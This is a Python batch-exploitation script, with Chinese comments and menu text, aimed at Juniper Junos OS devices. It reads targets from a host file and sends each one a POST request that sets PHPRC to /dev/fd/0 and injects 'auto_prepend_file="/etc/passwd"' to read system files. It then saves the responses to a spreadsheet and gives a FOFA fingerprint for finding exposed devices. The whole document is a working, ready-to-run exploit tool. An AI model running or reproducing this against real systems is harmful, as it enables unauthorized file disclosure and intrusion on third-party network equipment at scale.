

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import tools.GlobalTool as Tool
import tools.HttpTool as NetWork

def help():
    print('''
    fofa: fid="P50yWPSaXR07gFYuOOqR2g=="
        1. Juniper Networks Junos OS任意文件读取, 批量测试
    x. 退出
    ''')


def vul_PHPRC(url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.69',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Sec-Ch-Ua': '"-Not.A/Brand";v="8", "Chromium";v="102"',
        'Sec-Ch-Ua-Mobile': '?0'
    }
    body = 'auto_prepend_file="/etc/passwd"'
    method = "POST"
    path = "/?PHPRC=/dev/fd/0"
    notes = ""
    return (url, method, headers, body, path, notes)

def run():
    OUTDIR = "result/Juniper"
    # 获取当前日期和时间
    formatted_datetime = Tool.getime()
    file = "dat.txt"
    li = Tool.read_host_file(file)
    Tool.mkdir(OUTDIR)
    help()
    num = int(input("执行的指令: "))
    if num == 1:
        data = []
        for url in li:
            item = vul_PHPRC(url)
            data.append(item)
        s = NetWork.HttpTool()
        y = s.async_httpx_start(data)

        res = []
        for k, v in y.items():
            res.append(v[:-2])
        ti = ['地址', '状态码', '标题', '请求体', '状态', 'ip', 'port', 'ip_port', '备注']
        Tool.write_to_xlsx(ti, res, f"{OUTDIR}/{formatted_datetime}Juniper Networks Junos OS任意文件读取.xlsx")

    else:
        print('bye...')


